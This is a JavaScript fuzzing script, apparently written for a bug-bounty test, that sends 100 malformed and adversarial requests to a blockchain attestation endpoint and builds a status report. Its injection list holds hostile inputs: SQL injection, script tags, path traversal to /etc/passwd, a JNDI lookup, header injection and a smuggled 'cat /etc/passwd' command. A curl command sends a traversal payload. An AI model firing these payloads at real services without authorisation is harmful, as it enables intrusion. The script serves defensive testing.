const fs = require("fs");
const crypto = require("crypto");

const ENDPOINT = "https://rustchain.org/attest/submit";
const OUT_DIR = "work/attest-fuzz-1112";
const JSONL = `${OUT_DIR}/attest-submit-fuzz-results.jsonl`;
const REPORT = `${OUT_DIR}/attest-submit-fuzz-report.md`;

fs.mkdirSync(OUT_DIR, { recursive: true });
fs.writeFileSync(JSONL, "");

const wallet = "RTCa14a8b8553834f4593db826222424420bf6f8417";
const baseValidish = {
  miner_id: wallet,
  nonce: "tracepatch-lab-fuzz",
  timestamp: new Date().toISOString(),
  proof: "dry-run-proof",
  signature: "dry-run-signature",
};

const cases = [];
function add(category, name, body, headers = { "content-type": "application/json" }) {
  cases.push({ id: cases.length + 1, category, name, body, headers });
}

// Missing fields: 25 cases.
for (const field of ["miner", "miner_id", "nonce", "timestamp", "proof", "signature"]) {
  const obj = { ...baseValidish };
  delete obj[field];
  add("missing_fields", `missing_${field}`, JSON.stringify(obj));
}
add("missing_fields", "empty_object", JSON.stringify({}));
add("missing_fields", "empty_array", JSON.stringify([]));
add("missing_fields", "null_body", "null");
add("missing_fields", "boolean_body", "true");
for (let i = 0; i < 15; i++) {
  add("missing_fields", `only_single_field_${i}`, JSON.stringify({ [["miner_id", "nonce", "timestamp", "proof", "signature"][i % 5]]: `value-${i}` }));
}

// Wrong types: 25 cases.
const wrongValues = [null, true, false, 0, 123.456, [], {}, ["x"], { nested: "x" }, ""];
for (let i = 0; i < 25; i++) {
  const field = ["miner_id", "nonce", "timestamp", "proof", "signature"][i % 5];
  const obj = { ...baseValidish, [field]: wrongValues[i % wrongValues.length] };
  add("wrong_types", `wrong_type_${field}_${i}`, JSON.stringify(obj));
}

// Oversized or boundary-ish inputs: 20 cases.
const sizes = [1024, 4096, 8192, 16384, 32768];
for (let i = 0; i < 20; i++) {
  const field = ["miner_id", "nonce", "proof", "signature"][i % 4];
  const obj = { ...baseValidish, [field]: "A".repeat(sizes[i % sizes.length]) };
  add("oversized_inputs", `oversized_${field}_${sizes[i % sizes.length]}_${i}`, JSON.stringify(obj));
}

// Injection-style strings: 20 cases.
const injections = [
  "' OR '1'='1",
  "\"; DROP TABLE attestations; --",
  "<script>alert(1)</script>",
  "../../etc/passwd",
  "${jndi:ldap://example.invalid/a}",
  "{{7*7}}",
  "\u0000null-byte",
  "miner\nX-Injected: yes",
  "🚧 unicode probe",
  "RTCa14a8b8553834f4593db826222424420bf6f8417; cat /etc/passwd",
];
for (let i = 0; i < 20; i++) {
  const field = ["miner_id", "nonce", "proof", "signature"][i % 4];
  const obj = { ...baseValidish, [field]: injections[i % injections.length] };
  add("injection_style", `injection_${field}_${i}`, JSON.stringify(obj));
}

// Malformed JSON and content-type probes: 10 cases.
add("malformed_json", "truncated_object", '{"miner_id":"abc"');
add("malformed_json", "bad_array", "[1,2,");
add("malformed_json", "plain_text_json_type", "not-json");
add("malformed_json", "xml_json_type", "<miner>abc</miner>");
add("malformed_json", "duplicate_keys", '{"miner_id":"a","miner_id":"b","proof":"x"}');
add("content_type", "text_plain_json", JSON.stringify(baseValidish), { "content-type": "text/plain" });
add("content_type", "form_urlencoded", "miner_id=abc&proof=x", { "content-type": "application/x-www-form-urlencoded" });
add("content_type", "no_content_type", JSON.stringify(baseValidish), {});
add("content_type", "empty_body_json", "", { "content-type": "application/json" });
add("content_type", "whitespace_body_json", "   ", { "content-type": "application/json" });

if (cases.length !== 100) {
  throw new Error(`expected 100 cases, got ${cases.length}`);
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function summarizeBody(text) {
  const normalized = text.replace(/\s+/g, " ").slice(0, 500);
  return {
    sha256: crypto.createHash("sha256").update(text).digest("hex"),
    sample: normalized,
  };
}

(async () => {
  const rows = [];
  for (const tc of cases) {
    const started = Date.now();
    let row;
    try {
      const res = await fetch(ENDPOINT, {
        method: "POST",
        headers: tc.headers,
        body: tc.body,
      });
      const text = await res.text();
      const bodySummary = summarizeBody(text);
      row = {
        id: tc.id,
        category: tc.category,
        name: tc.name,
        status: res.status,
        ok: res.ok,
        content_type: res.headers.get("content-type") || "",
        request_id: res.headers.get("x-request-id") || "",
        elapsed_ms: Date.now() - started,
        body_sha256: bodySummary.sha256,
        body_sample: bodySummary.sample,
      };
    } catch (err) {
      row = {
        id: tc.id,
        category: tc.category,
        name: tc.name,
        network_error: String(err && err.message ? err.message : err),
        elapsed_ms: Date.now() - started,
      };
    }
    rows.push(row);
    fs.appendFileSync(JSONL, JSON.stringify(row) + "\n");
    await sleep(80);
  }

  const byStatus = {};
  const byCategory = {};
  for (const r of rows) {
    const status = r.status ? String(r.status) : "network_error";
    byStatus[status] = (byStatus[status] || 0) + 1;
    byCategory[r.category] ||= {};
    byCategory[r.category][status] = (byCategory[r.category][status] || 0) + 1;
  }
  const serverErrors = rows.filter((r) => r.status >= 500 || r.network_error);
  const successLike = rows.filter((r) => r.status >= 200 && r.status < 300);
  const notable = rows.filter((r) => r.status && ![400, 401, 403, 404, 405, 413, 415, 422, 429].includes(r.status));

  const lines = [];
  lines.push("# `/attest/submit` Structured Fuzzing Report");
  lines.push("");
  lines.push("- Tester: tracepatch-lab");
  lines.push(`- Date: ${new Date().toISOString()}`);
  lines.push(`- Endpoint: \`${ENDPOINT}\``);
  lines.push("- Scope: 100 malformed or adversarial POST payloads, sent at a low fixed cadence.");
  lines.push("- Wallet for bounty claim: `RTCa14a8b8553834f4593db826222424420bf6f8417`");
  lines.push("");
  lines.push("## Summary Counts");
  lines.push("");
  lines.push("| Response class/status | Count |");
  lines.push("|---|---:|");
  for (const [status, count] of Object.entries(byStatus).sort()) {
    lines.push(`| ${status} | ${count} |`);
  }
  lines.push("");
  lines.push("## Category Matrix");
  lines.push("");
  lines.push("| Category | Status counts |");
  lines.push("|---|---|");
  for (const [category, counts] of Object.entries(byCategory)) {
    const summary = Object.entries(counts).sort().map(([s, c]) => `${s}: ${c}`).join(", ");
    lines.push(`| ${category} | ${summary} |`);
  }
  lines.push("");
  lines.push("## Findings");
  lines.push("");
  if (serverErrors.length === 0 && successLike.length === 0) {
    lines.push("No 500-class responses, network failures, or successful 2xx accepts were observed for malformed/adversarial payloads. The endpoint consistently rejected the test corpus with 400-class validation responses.");
  } else {
    lines.push(`- 500/network-error cases: ${serverErrors.length}`);
    lines.push(`- 2xx success-like cases: ${successLike.length}`);
  }
  if (notable.length > 0) {
    lines.push("");
    lines.push("Notable non-standard statuses:");
    for (const r of notable.slice(0, 20)) {
      lines.push(`- Case ${r.id} ${r.category}/${r.name}: HTTP ${r.status}, request id ${r.request_id || "n/a"}`);
    }
  }
  lines.push("");
  lines.push("## Reproduction Notes");
  lines.push("");
  lines.push("The raw JSONL file contains one row per request with category, case name, HTTP status, content type, request id, elapsed time, response body hash, and a short response sample.");
  lines.push("");
  lines.push("Representative command:");
  lines.push("");
  lines.push("```bash");
  lines.push("curl -sS -i https://rustchain.org/attest/submit \\");
  lines.push("  -H 'Content-Type: application/json' \\");
  lines.push("  --data '{\"miner_id\":\"../../etc/passwd\",\"proof\":\"dry-run-proof\"}'");
  lines.push("```");
  lines.push("");
  lines.push("## Payload Categories");
  lines.push("");
  lines.push("- `missing_fields`: absent miner/proof/timestamp/signature fields and structurally empty bodies.");
  lines.push("- `wrong_types`: null, boolean, number, array, and object values in fields that should be strings.");
  lines.push("- `oversized_inputs`: controlled 1 KiB to 32 KiB field expansions.");
  lines.push("- `injection_style`: SQL-ish, script, path traversal, template, header-injection, null-byte, and unicode probes.");
  lines.push("- `malformed_json` / `content_type`: truncated JSON, non-JSON bodies, duplicate keys, form encoding, text/plain, and empty bodies.");
  lines.push("");
  lines.push("## Raw Result Artifacts");
  lines.push("");
  lines.push("- JSONL: `attest-submit-fuzz-results.jsonl`");
  lines.push("- Script: `fuzz-attest.js`");
  lines.push("");
  fs.writeFileSync(REPORT, lines.join("\n") + "\n");

  console.log(JSON.stringify({ cases: rows.length, byStatus, byCategory, serverErrors: serverErrors.length, successLike: successLike.length, report: REPORT, jsonl: JSONL }, null, 2));
})();
